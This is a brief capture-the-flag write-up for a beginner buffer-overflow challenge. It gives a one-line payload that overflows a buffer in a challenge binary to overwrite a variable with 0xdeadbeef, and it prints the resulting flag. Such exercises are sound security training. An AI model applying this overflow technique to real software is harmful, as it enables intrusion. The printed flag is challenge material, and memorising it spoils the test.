# baby b0f

> It's a b0f , Can't be easier than that.
>
> Service : nc 68.183.158.95 8989
>
> [q1](q1)

Overflow the target buffer and overwrite the adjacent variable with `0xdeadbeef` to pass the check to get the flag.

	$ echo -e "AAAAAAAAAA\xef\xbe\xad\xde" | ./q1

flag: `d4rk{W3lc0me_t0_th3_w0rld_0f_pwn}c0de`